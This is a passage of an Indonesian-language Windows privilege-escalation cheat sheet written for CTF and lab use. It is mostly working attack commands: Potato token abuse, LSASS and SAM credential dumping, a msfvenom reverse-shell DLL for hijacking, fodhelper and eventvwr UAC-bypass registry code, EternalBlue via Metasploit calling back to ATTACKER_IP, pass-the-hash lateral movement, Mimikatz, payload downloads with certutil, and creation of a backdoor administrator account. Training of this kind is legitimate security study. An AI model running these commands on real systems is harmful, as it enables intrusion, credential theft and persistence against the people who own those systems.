---

# 5.2.4 🥔 PrintSpoofer

Pada environment yang kompatibel:

```cmd
REM Jalankan command sebagai SYSTEM
.\PrintSpoofer.exe -i -c cmd.exe
```

Verifikasi:

```cmd
REM Cek current identity
whoami
```

Target:

```text
nt authority\system
```

---

# 5.2.5 🥔 GodPotato

Pada target yang kompatibel:

```cmd
REM Jalankan command sederhana terlebih dahulu
.\GodPotato.exe -cmd "cmd /c whoami"
```

Expected:

```text
nt authority\system
```

Setelah terbukti:

```cmd
REM Jalankan command yang dibutuhkan lab
.\GodPotato.exe -cmd "cmd /c C:\Temp\payload.exe"
```

---

# 5.2.6 🥔 JuicyPotato

JuicyPotato terutama relevan pada Windows lama/konfigurasi tertentu.

Contoh:

```cmd
REM Contoh penggunaan pada environment lama
.\JuicyPotato.exe ^
  -l 1337 ^
  -p C:\Windows\System32\cmd.exe ^
  -a "/c whoami" ^
  -t *
```

Jika membutuhkan CLSID:

```cmd
REM Contoh dengan CLSID tertentu
.\JuicyPotato.exe ^
  -l 1337 ^
  -p C:\Windows\System32\cmd.exe ^
  -a "/c whoami" ^
  -t * ^
  -c "{CLSID}"
```

Jangan menyalin CLSID dari challenge lain tanpa melakukan validation.

---

# 5.2.7 🥔 RoguePotato

RoguePotato memiliki requirement jaringan dan OS-specific behavior.

Contoh pola:

```cmd
REM Contoh format umum RoguePotato
.\RoguePotato.exe ^
  -r ATTACKER_IP ^
  -e "C:\Temp\payload.exe" ^
  -l 9999
```

Jika gagal:

```text
cek RPC
cek outbound connectivity
cek firewall
cek port
cek OS build
cek privilege
```

---

# 5.2.8 🚫 Kapan Potato Tidak Bekerja?

```text
[ ] SeImpersonatePrivilege tidak ada
[ ] Target tidak kompatibel
[ ] Technique membutuhkan service yang tidak tersedia
[ ] COM/RPC mechanism dibatasi
[ ] Firewall menghalangi
[ ] Tool architecture salah
[ ] AV/EDR memblokir executable
[ ] Token tidak bisa diperoleh dengan technique tersebut
```

Decision:

```text
SeImpersonate?
     │
     ├── NO → pindah vector
     │
     └── YES
           │
           ▼
      Cek OS/build
           │
           ▼
      Cek service/pipe/RPC
           │
           ▼
      Pilih technique
           │
           ▼
        Verify
```

---

# 5.3 🧠 SeDebugPrivilege

Konsep:

```text
SeDebugPrivilege
      ↓
akses lebih luas terhadap process
      ↓
potensi credential/process abuse
```

Check:

```cmd
REM Cek privilege
whoami /priv | findstr /i SeDebugPrivilege
```

---

## LSASS dump

Dalam lab yang memang mengizinkan credential analysis:

```cmd
REM Ambil LSASS dump dengan ProcDump
.\procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

Transfer ke Parrot:

```bash
# Analisis dump dengan pypykatz
pypykatz lsa minidump lsass.dmp
```

### ⚠️ Catatan

LSASS dump dapat berisi credential material yang sangat sensitif. Gunakan hanya pada target yang memang berada dalam scope lab/engagement.

---

# 5.4 💾 SeBackupPrivilege / SeRestorePrivilege

Konsep:

```text
SeBackupPrivilege
    ↓
backup semantics
    ↓
dapat membaca objek/file tertentu
meskipun ACL biasa membatasi
```

Contoh hive backup dalam lab:

```cmd
REM Simpan SAM hive
reg save HKLM\SAM C:\Temp\sam.hive

REM Simpan SYSTEM hive
reg save HKLM\SYSTEM C:\Temp\system.hive

REM Simpan SECURITY hive bila diperlukan
reg save HKLM\SECURITY C:\Temp\security.hive
```

Transfer:

```bash
# Analisis SAM + SYSTEM pada attacker
python3 /opt/impacket/examples/secretsdump.py \
  -sam sam.hive \
  -system system.hive \
  LOCAL
```

---

# 5.5 👑 SeTakeOwnershipPrivilege

Konsep:

```text
SeTakeOwnershipPrivilege
      ↓
take ownership
      ↓
ubah ACL
      ↓
akses object
```

Contoh lab:

```cmd
REM Ambil ownership file
takeown /f C:\Path\To\SensitiveFile

REM Berikan full control kepada current user
icacls C:\Path\To\SensitiveFile /grant "%USERNAME%":F
```

Kemudian:

```cmd
REM Akses file setelah ACL berubah
type C:\Path\To\SensitiveFile
```

`SeTakeOwnershipPrivilege` sendiri tidak berarti:

```text
langsung SYSTEM
```

Ia lebih tepat dilihat sebagai:

```text
privileged file/object access primitive
```

yang dapat digabungkan dengan jalur lain.

---

# 🧬 BAGIAN 6 — DLL HIJACKING

# 6.1 🧠 Konsep DLL Hijacking

Aplikasi Windows mungkin memuat DLL berdasarkan search behavior.

Masalah dapat muncul ketika:

```text
application
     ↓
LoadLibrary("missing.dll")
     ↓
search sequence
     ↓
attacker-controlled DLL ditemukan lebih dahulu
```

---

## Bentuk umum

```text
Missing DLL
    ↓
DLL tidak ada
    ↓
attacker supply DLL

DLL Side-loading
    ↓
trusted EXE
    ↓
malicious DLL dengan nama expected

Writable search directory
    ↓
attacker-controlled DLL
```

---

# 6.2 🔎 Identifikasi dengan Procmon

Process Monitor sangat berguna.

Filter:

```text
Process Name = target.exe
Operation = CreateFile / Load Image
Result = NAME NOT FOUND
Path ends with .dll
```

Temuan:

```text
C:\Program Files\App\missing.dll   NAME NOT FOUND
```

menjadi candidate.

---

# 6.3 🔍 PowerUp

```powershell
# Cari process DLL hijacking
Find-ProcessDLLHijack

# Cari writable PATH locations
Find-PathDLLHijack
```

---

# 6.4 🛣️ Writable PATH

```powershell
# Pecah PATH menjadi setiap directory
$env:PATH -split ';'
```

Periksa ACL:

```powershell
# Cari directory PATH yang dapat ditulis
$env:PATH -split ';' |
    ForEach-Object {
        if (Test-Path $_) {
            try {
                $acl = Get-Acl $_
                $acl.Access |
                    Where-Object {
                        $_.FileSystemRights -match 'Write|Modify|FullControl'
                    } |
                    ForEach-Object {
                        Write-Output "[+] Candidate: $_"
                    }
            } catch {}
        }
    }
```

---

# 6.5 💥 Membuat DLL Lab

Di Parrot:

```bash
# Buat DLL payload sederhana
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=$ATTACKER_IP \
  LPORT=4444 \
  -f dll \
  -o malicious.dll
```

Transfer:

```cmd
REM Upload DLL ke lokasi yang tepat
copy malicious.dll "C:\Writable\ExpectedName.dll"
```

Kemudian:

```text
trigger application
        ↓
DLL load
        ↓
listener receives connection
```

---

# 6.6 🧩 Side-loading

Contoh model:

```text
trusted.exe
    │
    └── expects helper.dll
             │
             ▼
      C:\Writable\helper.dll
```

Jika:

```text
trusted.exe berjalan elevated
+
helper.dll dikontrol attacker
```

maka:

```text
DLL code
   ↓
executed in trusted process
   ↓
inherits process context
```

---

# 6.7 🚫 Kapan DLL Hijacking Tidak Bekerja?

```text
[ ] DLL tidak benar-benar dicari
[ ] Search order berbeda
[ ] Safe DLL search behavior
[ ] Directory tidak writable
[ ] Process tidak privileged
[ ] DLL architecture mismatch
[ ] Export functions tidak cocok
[ ] Application melakukan signature/integrity verification
[ ] AV/EDR memblokir payload
```

---

# 🔐 BAGIAN 7 — CREDENTIAL DISCOVERY

# 7.1 📂 File Credential Hunting

```cmd
REM Cari file berdasarkan nama
dir /s /b *password* *cred* *secret* *config* 2>nul

REM Cari plaintext credential pada file
findstr /si password *.xml *.ini *.txt *.config 2>nul

REM Cari credential pada scripts
findstr /si password *.ps1 *.bat *.cmd 2>nul
```

PowerShell:

```powershell
# Recursive credential search
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue `
    -Include *.txt,*.xml,*.ini,*.config,*.ps1,*.bat |
    Select-String `
        -Pattern 'password|passwd|credential|secret|token'
```

---

# 7.2 🪟 Unattended Installation Files

Lokasi umum:

```cmd
REM Unattend
type C:\Windows\Panther\Unattend.xml 2>nul

REM Alternate path
type C:\Windows\Panther\Unattend\Unattend.xml 2>nul

REM Sysprep
type C:\Windows\System32\Sysprep\sysprep.xml 2>nul

REM Panther sysprep
type C:\Windows\System32\Sysprep\Panther\unattend.xml 2>nul
```

Cari:

```text
Username
Password
Domain
AutoLogon
```

---

# 7.3 🌐 IIS Configuration

```cmd
REM IIS web.config
type C:\inetpub\wwwroot\web.config 2>nul

REM .NET configuration
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul
```

---

# 7.4 🛠️ XAMPP / WAMP

```cmd
REM XAMPP phpMyAdmin
type C:\xampp\phpMyAdmin\config.inc.php 2>nul

REM WAMP
type C:\wamp\phpMyAdmin\config.inc.php 2>nul
```

---

# 7.5 📝 PowerShell History

Current user:

```powershell
# Tampilkan history save path
(Get-PSReadLineOption).HistorySavePath

# Baca history
Get-Content (Get-PSReadLineOption).HistorySavePath
```

Common path:

```cmd
REM Common PowerShell history file
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
```

Cari:

```text
password
ConvertTo-SecureString
net user
runas
ssh
Invoke-WebRequest
SQL credential
API token
```

---

# 7.6 🔑 Credential Manager

```cmd
REM List stored credentials
cmdkey /list
```

Contoh:

```text
Currently stored credentials:

    Target: LegacyGeneric:target=TERMSRV/10.10.10.20
    Type: Generic
    User: CORP\alice
```

Ini berarti ada credential target yang menarik untuk investigation.

---

## `runas /savecred`

Jika current user memiliki stored credential yang relevan:

```cmd
REM Test stored credentials
runas /savecred /user:DOMAIN\USERNAME "cmd.exe"
```

Verifikasi:

```cmd
REM Check resulting identity
whoami
```

Kapan tidak bekerja:

```text
[ ] Tidak ada saved credential
[ ] Target credential tidak relevan
[ ] Policy membatasi
[ ] Credential sudah invalid
```

---

# 7.7 🧂 SAM Database

## Registry hive

```cmd
REM Simpan SAM
reg save HKLM\SAM C:\Temp\sam.hive

REM Simpan SYSTEM
reg save HKLM\SYSTEM C:\Temp\system.hive
```

Transfer:

```bash
# Dump local hashes
python3 /opt/impacket/examples/secretsdump.py \
  -sam sam.hive \
  -system system.hive \
  LOCAL
```

---

# 7.8 📡 Wi-Fi Credentials

```cmd
REM List Wi-Fi profiles
netsh wlan show profiles
```

Profile tertentu:

```cmd
REM Tampilkan profile dan clear key jika diizinkan
netsh wlan show profile name="PROFILE_NAME" key=clear
```

Cari:

```text
Key Content
```

---

# 🚨 BAGIAN 8 — UAC BYPASS

# 8.1 🛡️ Memahami UAC

UAC bukan:

```text
"Administrator tidak bisa menjalankan apa pun."
```

UAC lebih tepat dipahami sebagai:

```text
Administrator
      ↓
split token
      ↓
standard/medium token
      +
elevated/high token
```

---

# 8.2 🔎 Check UAC

```cmd
REM EnableLUA
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA

REM ConsentPromptBehaviorAdmin
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
```

Integrity:

```cmd
REM Cari integrity membership
whoami /groups | findstr /i "Mandatory Label"
```

Contoh:

```text
Mandatory Label\Medium Mandatory Level
```

berarti current process belum elevated.

---

# 8.3 🧨 Fodhelper

Konsep historical:

```text
fodhelper.exe
    ↓
auto-elevated behavior
    ↓
registry handler
    ↓
attacker-controlled command
```

Namun:

> Teknik UAC bypass sangat build-dependent dan banyak varian lama sudah diperbaiki atau dipengaruhi oleh policy/security controls.

Pada lab yang memang menyediakan vulnerable configuration, salah satu pola registry hijacking historis adalah:

```powershell
# Buat registry command handler untuk lab
New-Item `
    "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Force

# Tambahkan DelegateExecute
New-ItemProperty `
    -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "DelegateExecute" `
    -Value "" `
    -Force

# Atur command
Set-ItemProperty `
    -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "(default)" `
    -Value "cmd.exe" `
    -Force
```

Trigger:

```powershell
# Jalankan auto-elevated binary
Start-Process "$env:WINDIR\System32\fodhelper.exe"
```

Cleanup:

```powershell
# Hapus registry artifacts
Remove-Item `
    "HKCU:\Software\Classes\ms-settings\" `
    -Recurse `
    -Force `
    -ErrorAction SilentlyContinue
```

---

# 8.4 🧨 Eventvwr

Historical technique:

```powershell
# Buat handler registry lab
New-Item `
    "HKCU:\Software\Classes\mscfile\shell\open\command" `
    -Force

# Atur command
Set-ItemProperty `
    -Path "HKCU:\Software\Classes\mscfile\shell\open\command" `
    -Name "(default)" `
    -Value "cmd.exe" `
    -Force
```

Trigger:

```powershell
# Launch eventvwr
Start-Process "$env:WINDIR\System32\eventvwr.exe"
```

Cleanup:

```powershell
# Cleanup registry
Remove-Item `
    "HKCU:\Software\Classes\mscfile\" `
    -Recurse `
    -Force `
    -ErrorAction SilentlyContinue
```

---

# 8.5 🧰 UACME

UACME merupakan collection research/tooling untuk UAC bypass techniques.

Model penggunaan:

```text
OS/build
     ↓
eligible method
     ↓
UAC state
     ↓
method selection
```

Jangan:

```text
copy random method number
↓
assume universal
```

---

# 🩹 BAGIAN 9 — KERNEL & PATCH EXPLOITATION

# 9.1 🔎 Build Number

```powershell
# OS version object
[System.Environment]::OSVersion

# Windows build number
(Get-CimInstance Win32_OperatingSystem).BuildNumber

# Full OS info
Get-CimInstance Win32_OperatingSystem |
    Select-Object Caption, Version, BuildNumber, OSArchitecture
```

---

# 9.2 🩹 Hotfix

```powershell
# Installed hotfix
Get-HotFix |
    Select-Object HotFixID, InstalledOn |
    Sort-Object InstalledOn -Descending
```

Simpan:

```cmd
REM Export system information
systeminfo > C:\Temp\systeminfo.txt

REM Export patches
wmic qfe list brief > C:\Temp\patches.txt
```

---

# 9.3 🔬 WES-NG

Di Parrot:

```bash
# Install/update WES-NG
python3 -m pip install wesng
```

Update:

```bash
# Update database
wes.py --update
```

Analyze:

```bash
# Analyze target systeminfo
wes.py systeminfo.txt
```

Kemudian:

```text
Build
+
Installed patches
+
CVE database
=
Candidate list
```

---

# 9.4 📋 Common Historical Windows LPE CVEs

|CVE|Nama / Kategori|Dampak umum|Catatan|
|---|---|---|---|
|CVE-2018-8120|Win32k LPE|SYSTEM|Windows lama|
|CVE-2019-1388|UAC bypass|Elevated execution|Interaction/build dependent|
|CVE-2020-0787|BITS|LPE|Patch-dependent|
|CVE-2021-36934|HiveNightmare / SeriousSAM|Sensitive SAM access|Configuration-dependent|
|CVE-2021-34484|Windows User Profile Service|LPE|Build-dependent|
|CVE-2021-34527|PrintNightmare|LPE/RCE|Spooler/config dependent|
|CVE-2021-36968|Windows AFD|LPE|Kernel vulnerability|
|CVE-2022-21999|SpoolFool|SYSTEM|Print Spooler context|
|CVE-2022-24521|CLFS|LPE|Kernel|
|CVE-2022-26809|RPC Runtime|RCE|Not purely local PrivEsc|
|CVE-2022-22047|Windows CSRSS|LPE|Build-dependent|
|CVE-2023-23397|Outlook|NTLM theft/RCE path|Context-specific|
|CVE-2023-21768|Windows CLFS|LPE|Kernel|
|CVE-2023-28252|CLFS|LPE|Kernel|
|CVE-2024-30085|Windows Kernel|LPE|Modern build-dependent|

### Prinsip

Nama CVE:

```text
bukan bukti vulnerability
```

Harus diverifikasi dengan:

```text
Exact build
+
patch status
+
architecture
+
affected range
+
mitigation
```

---

# 9.5 💣 MS17-010 / EternalBlue

MS17-010 bukan sekadar:

```text
"Windows lama = vulnerable"
```

Cek dari Parrot:

```bash
# Cek SMB port
nmap -p445 --script smb-vuln-ms17-010 $TARGET_IP
```

Jika hasil menunjukkan vulnerable:

```text
Host script results:
smb-vuln-ms17-010:
  VULNERABLE
```

Baru lanjut ke lab-approved exploitation.

Metasploit:

```bash
# Start Metasploit
msfconsole -q
```

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST ATTACKER_IP
run
```

Manual exploit frameworks juga tersedia, tetapi tetap harus menyesuaikan exact target.

---

# ⏰ BAGIAN 10 — SCHEDULED TASK EXPLOITATION

# 10.1 🔎 Task Enumeration

```cmd
REM Semua scheduled tasks
schtasks /query /fo LIST /v
```

PowerShell:

```powershell
# Enumerate task definitions
Get-ScheduledTask |
    Select-Object TaskName, TaskPath, State
```

---

# 10.2 👑 Cari Task yang Dijalankan SYSTEM

```cmd
REM Tampilkan semua detail
schtasks /query /fo LIST /v
```

Cari:

```text
Run As User: SYSTEM
```

Kemudian cari:

```text
Task To Run:
C:\Tasks\backup.exe
```

---

# 10.3 ✏️ Cek File Permission

```cmd
REM File permission
icacls "C:\Tasks\backup.exe"
```

Jika:

```text
BUILTIN\Users:(M)
```

maka:

```text
SYSTEM executes
+
Users modify
=
strong PrivEsc candidate
```

---

# 10.4 💥 Replace Scheduled Task Binary

Backup:

```cmd
REM Backup original
copy "C:\Tasks\backup.exe" "C:\Temp\backup.exe.bak"
```

Replace:

```cmd
REM Replace dengan lab payload
copy "C:\Temp\payload.exe" "C:\Tasks\backup.exe"
```

Trigger:

```cmd
REM Jalankan task manual bila current user memiliki izin
schtasks /run /tn "\TaskName"
```

Verifikasi:

```cmd
REM Verify
whoami
```

---

# 10.5 📂 Writable Task Directory

Misalnya:

```text
Task:
C:\Scripts\backup.ps1
```

Cek:

```cmd
REM Directory ACL
icacls "C:\Scripts"
```

Jika current user dapat modify:

```text
SYSTEM
 ↓
executes C:\Scripts\backup.ps1
 ↓
attacker controls script
```

---

# 🔑 BAGIAN 11 — HASH & LATERAL MOVEMENT

# 11.1 🧂 NTLM Hash

Setelah mendapat local hash dari lab, hash dapat digunakan untuk authentication testing pada services yang kompatibel.

Di Parrot:

```bash
# SMB authentication test menggunakan NTLM hash
nxc smb $TARGET_IP \
  -u Administrator \
  -H NTLM_HASH
```

---

# 11.2 💻 Impacket `psexec`

```bash
# Authenticate menggunakan NTLM hash
python3 /opt/impacket/examples/psexec.py \
  -hashes :NTLM_HASH \
  Administrator@$TARGET_IP
```

Alternatif:

```bash
# WMI execution
python3 /opt/impacket/examples/wmiexec.py \
  -hashes :NTLM_HASH \
  Administrator@$TARGET_IP
```

SMBExec:

```bash
# SMB service execution
python3 /opt/impacket/examples/smbexec.py \
  -hashes :NTLM_HASH \
  Administrator@$TARGET_IP
```

---

# 11.3 🔄 Credential Reuse

Setelah menemukan password:

```text
credential
    ↓
SMB
WinRM
RDP
SSH
application
database
```

SMB:

```bash
# Test credential pada SMB
nxc smb $TARGET_IP \
  -u USERNAME \
  -p PASSWORD
```

WinRM:

```bash
# WinRM
evil-winrm \
  -i $TARGET_IP \
  -u USERNAME \
  -p PASSWORD
```

RDP:

```bash
# RDP
xfreerdp \
  /u:USERNAME \
  /p:PASSWORD \
  /v:$TARGET_IP \
  /dynamic-resolution
```

SSH:

```bash
# SSH bila service tersedia
ssh USERNAME@$TARGET_IP
```

---

# 🤖 BAGIAN 12 — AUTOMATED PRIVESC TOOLS WORKFLOW

# 12.1 🧭 Tool Order

```text
        WINDOWS SHELL
             │
             ▼
     ┌───────────────┐
     │ whoami /all   │
     │ whoami /priv  │
     └───────┬───────┘
             │
             ▼
     ┌────────────────┐
     │ systeminfo     │
     │ qfe / hotfix   │
     └───────┬────────┘
             │
             ▼
         WINPEAS
             │
             ▼
      ANALYZE FINDINGS
             │
      ┌──────┴───────┐
      │              │
      ▼              ▼
    SERVICE         TOKEN
      │              │
      ▼              ▼
  accesschk       Potato
      │
      ▼
   REGISTRY
      │
      ▼
   CREDENTIALS
      │
      ▼
 SCHEDULED TASK
      │
      ▼
 DLL / PATH
      │
      ▼
 PATCH / KERNEL
```

---

# 12.2 📦 Windows File Transfer Master Workflow

## Method 1 — HTTP + certutil

Parrot:

```bash
# HTTP server
cd /opt/tools-windows
python3 -m http.server 8080
```

Windows:

```cmd
REM Download file
certutil -urlcache -split -f ^
  http://ATTACKER_IP:8080/winpeas.exe ^
  winpeas.exe
```

---

## Method 2 — PowerShell IWR

```powershell
# Download file
Invoke-WebRequest `
  -Uri "http://ATTACKER_IP:8080/winpeas.exe" `
  -OutFile ".\winpeas.exe"
```

---

## Method 3 — SMB server

Parrot:

```bash
# Start Impacket SMB server
python3 /opt/impacket/examples/smbserver.py \
  share \
  /opt/tools-windows \
  -smb2support
```

Windows:

```cmd
REM Copy from SMB share
copy \\ATTACKER_IP\share\winpeas.exe .
```

---

## Method 4 — Evil-WinRM

Parrot:

```bash
# Connect to WinRM
evil-winrm \
  -i $TARGET_IP \
  -u $USERNAME \
  -p $PASSWORD
```

Dalam session:

```text
*Evil-WinRM* PS> upload /opt/tools-windows/winpeas.exe
```

---

# 🔥 BAGIAN 13 — MASTER DECISION TREE

```text
╔══════════════════════════════════════════════╗
║          WINDOWS LOW-PRIV SHELL              ║
╚══════════════════════╤═══════════════════════╝
                       │
                       ▼
                [WHOAMI /ALL]
                       │
                       ▼
                [WHOAMI /PRIV]
                       │
          ┌────────────┼─────────────┐
          │            │             │
          ▼            ▼             ▼
   SeImpersonate    SeDebug      SeBackup/
      /Assign        │            Restore
          │          │                 │
          ▼          ▼                 ▼
       POTATO      LSASS          SAM/HIVES
       FAMILY       DUMP             │
          │          │               │
          └──────────┴───────┬───────┘
                             │
                             ▼
                         [WINPEAS]
                             │
        ┌────────────────────┼─────────────────────┐
        │                    │                     │
        ▼                    ▼                     ▼
     SERVICES             REGISTRY             CREDS
        │                    │                     │
        ▼                    ▼                     ▼
   Unquoted Path       AlwaysInstallElevated   History
   Weak ACL            Autorun                 Config
   Writable EXE        Autologon               Manager
        │                    │                     │
        ▼                    ▼                     ▼
      SERVICE             MSI /                 REUSE
      ABUSE              REGISTRY              CREDENTIAL
        │                    │                     │
        └──────────────┬─────┴─────────────┬───────┘
                       │                   │
                       ▼                   ▼
                [SCHEDULED TASK]        [DLL/PATH]
                       │                   │
                       ▼                   ▼
                 SYSTEM TASK          HIJACK
                       │                   │
                       └─────────┬─────────┘
                                 │
                                 ▼
                         [PATCH / KERNEL]
                                 │
                                 ▼
                       [UAC IF ADMIN]
                                 │
                                 ▼
                       [VERIFY PRIVILEGE]
                                 │
                                 ▼
                 ┌───────────────┴───────────────┐
                 │                               │
                 ▼                               ▼
              SUCCESS                         FAILED
                 │                               │
                 ▼                               ▼
              SYSTEM                    Return to Enum
                 │                               │
                 ▼                               │
             root/admin                         │
                 │                               │
                 └───────────────┬───────────────┘
                                 ▼
                              FLAG
```

---

# 🧠 BAGIAN 14 — COMMON ERRORS & TROUBLESHOOTING

|Situasi/Error|Penyebab umum|Solusi|
|---|---|---|
|`Access is denied`|Current token tidak memiliki permission|Cek `whoami /all` dan ACL|
|WinPEAS tidak dapat download|Egress blocked|Gunakan SMB/HTTP dari attacker|
|`certutil` gagal|Network/security restriction|Coba PowerShell/SMB|
|WinPEAS terdeteksi AV|Signature/behavior detection|Dalam CTF gunakan tool/lab yang diperbolehkan, jangan menganggap bypass selalu diperlukan|
|`sc start` gagal|Dependency/config problem|`sc qc`, cek service dependencies|
|`SERVICE_ACCESS_DENIED`|Tidak punya service control permission|Gunakan `accesschk`|
|Unquoted path ditemukan tapi tidak exploitable|Directory candidate tidak writable|Cek setiap intermediate directory|
|Service binary writable tetapi bukan SYSTEM|Service account low privilege|Cek `StartName`|
|Potato gagal|OS/tool incompatibility|Cek build dan privilege; pilih compatible technique|
|SeImpersonate tidak ada|Token tidak mendukung|Cari vector lain|
|PrintSpoofer gagal|Spooler/pipe/environment issue|Validasi requirement|
|GodPotato gagal|Build/security context berbeda|Jangan paksa; gunakan manual enum|
|`msiexec` tidak menghasilkan SYSTEM|AlwaysInstall policy tidak lengkap|Pastikan HKLM + HKCU sama-sama `1`|
|UAC bypass tidak bekerja|Patch/build/UAC policy|Cek UAC state dan jangan asumsi universal|
|Scheduled task tidak trigger|Schedule/permission/condition|`schtasks /query /fo LIST /v`|
|Task binary writable tapi tetap gagal|Task menjalankan user lain / integrity restriction|Validasi execution account|
|DLL hijack tidak trigger|DLL name/search order salah|Gunakan Procmon untuk melihat path|
|DLL crash aplikasi|DLL architecture/exports salah|Sesuaikan architecture dan exports|
|Reverse shell tidak masuk|Listener/IP/egress|Verifikasi routing dan listener|
|Hash authentication gagal|Hash salah / auth protocol mismatch|Validasi hash dan service|
|`reg save` gagal|Permission tidak cukup|Check token privileges|
|`runas /savecred` gagal|Tidak ada applicable stored credential|`cmdkey /list`|
|Kernel exploit crash|CVE tidak cocok|Re-check exact build + patch|
|`whoami` masih user biasa|Exploit hanya mendapat process/token berbeda|Verify technique and child process|
|SYSTEM shell mati|Payload/TTY/process issue|Test dengan `cmd /c whoami` terlebih dahulu|

---

# 🏆 BAGIAN 15 — POST-EXPLOITATION SETELAH SYSTEM

# 15.1 ✅ Verify SYSTEM

Jangan hanya melihat prompt:

```cmd
REM Current identity
whoami

REM Numeric identity/group info
whoami /all
```

Expected:

```text
nt authority\system
```

---

# 15.2 🔐 Credential Collection

Setelah SYSTEM, dalam CTF/lab dapat melakukan credential analysis.

Mimikatz:

```cmd
REM Jalankan Mimikatz
.\mimikatz.exe
```

Contoh commands:

```text
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::lsa /patch
```

---

# 15.3 💾 Registry Hive Collection

```cmd
REM Simpan local SAM
reg save HKLM\SAM C:\Temp\sam.hive

REM Simpan SYSTEM hive
reg save HKLM\SYSTEM C:\Temp\system.hive

REM Simpan SECURITY hive
reg save HKLM\SECURITY C:\Temp\security.hive
```

Transfer:

```bash
# Analyze local hives
python3 /opt/impacket/examples/secretsdump.py \
  -sam sam.hive \
  -system system.hive \
  -security security.hive \
  LOCAL
```

---

# 15.4 🔁 Persistence — CTF Context Only

Dalam CTF yang secara eksplisit memerlukan persistence testing:

```cmd
REM Tambah user
net user backdoor Password123! /add

REM Masukkan ke Administrators
net localgroup administrators backdoor /add
```

Namun pahami:

```text
Persistence
≠
Privilege Escalation
```

Jika sudah SYSTEM, persistence merupakan post-exploitation, bukan initial PrivEsc.

---

# 15.5 🖥️ RDP Enable

Pada lab:

```cmd
REM Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" ^
  /v fDenyTSConnections ^
  /t REG_DWORD ^
  /d 0 ^
  /f
```

Firewall:

```cmd
REM Enable Remote Desktop firewall group
netsh advfirewall firewall set rule ^
  group="remote desktop" ^
  new enable=Yes
```

---

# 15.6 🚩 Ambil Flag

User flag:

```cmd
REM Cari flag di user desktops
dir C:\Users\*\Desktop\user.txt 2>nul
dir C:\Users\*\Desktop\local.txt 2>nul
```

Root/Admin flag:

```cmd
REM Common Administrator flag locations
dir C:\Users\Administrator\Desktop\
```

Baca:

```cmd
REM Read root flag
type C:\Users\Administrator\Desktop\root.txt
```

Atau:

```cmd
REM Read proof file
type C:\Users\Administrator\Desktop\proof.txt
```

---

# 🧠 BAGIAN 16 — GOLDEN RULES WINDOWS PRIVESC

```text
RULE #01
Selalu jalankan whoami /all dan whoami /priv terlebih dahulu.

RULE #02
Current username tidak sama dengan current privilege level.

RULE #03
Administrators group tidak otomatis berarti current process = High Integrity.

RULE #04
SYSTEM berbeda dari Administrator.

RULE #05
SeImpersonatePrivilege adalah high-priority finding, bukan jaminan SYSTEM.

RULE #06
Potato technique selalu perlu dicocokkan dengan target environment.

RULE #07
WinPEAS adalah discovery tool, bukan oracle.

RULE #08
Temuan merah harus divalidasi manual.

RULE #09
AlwaysInstallElevated membutuhkan kondisi policy yang benar-benar terpenuhi.

RULE #10
Unquoted service path saja tidak cukup; writable intermediate path sangat penting.

RULE #11
Service berjalan sebagai SYSTEM tetapi binary tidak writable belum berarti exploitable.

RULE #12
Scheduled task harus dianalisis:
WHO → WHAT → WHERE → WHEN → CAN I MODIFY?

RULE #13
Credential reuse sering lebih stabil daripada kernel exploit.

RULE #14
PowerShell history harus dicek setiap mendapatkan Windows shell.

RULE #15
Credential Manager dapat memberikan lateral movement opportunity.

RULE #16
Registry adalah data source dan attack surface.

RULE #17
DLL hijacking memerlukan kontrol atas search location atau DLL yang dicari.

RULE #18
Kernel exploit adalah last resort.

RULE #19
Jangan menjalankan exploit tanpa mengetahui apa yang akan dimodifikasi.

RULE #20
Selalu verify hasil menggunakan whoami /all.

RULE #21
Gunakan simple payload seperti "whoami" untuk membuktikan execution sebelum reverse shell.

RULE #22
Saat exploit gagal, kembali ke enumeration; jangan sekadar mengganti exploit secara acak.

RULE #23
Exact OS build lebih penting daripada hanya nama Windows.

RULE #24
NTLM hash adalah credential material; perlakukan sebagai password-equivalent dalam lab.

RULE #25
Cleanup adalah bagian dari workflow, bukan pekerjaan opsional.
```

---

# ⚡ BAGIAN 17 — CHEATSHEET WINDOWS PRIVESC

## Initial Enum

```cmd
REM Current identity
whoami
whoami /all
whoami /priv
whoami /groups

REM OS
systeminfo

REM Users
net user

REM Administrators
net localgroup administrators

REM Network
ipconfig /all
route print
netstat -ano

REM Processes
tasklist /v

REM Services
sc query
wmic service get name,pathname,startmode,startname

REM Scheduled tasks
schtasks /query /fo LIST /v

REM Registry autorun
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

REM Winlogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

REM Credential Manager
cmdkey /list
```

---

## Token Privileges

```cmd
REM Show dangerous privileges
whoami /priv

REM SeImpersonate
whoami /priv | findstr /i SeImpersonatePrivilege

REM SeDebug
whoami /priv | findstr /i SeDebugPrivilege

REM SeBackup
whoami /priv | findstr /i SeBackupPrivilege

REM SeRestore
whoami /priv | findstr /i SeRestorePrivilege
```

---

## Service

```cmd
REM Query service
sc qc "SERVICENAME"

REM Service security descriptor
sc sdshow "SERVICENAME"

REM Modify service binary path if explicitly authorized
sc config "SERVICENAME" binPath= "C:\Temp\payload.exe"

REM Trigger
sc stop "SERVICENAME"
sc start "SERVICENAME"
```

---

## AlwaysInstallElevated

```cmd
REM HKLM
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" ^
  /v AlwaysInstallElevated

REM HKCU
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" ^
  /v AlwaysInstallElevated
```

---

## Credential Hunting

```cmd
REM Search file names
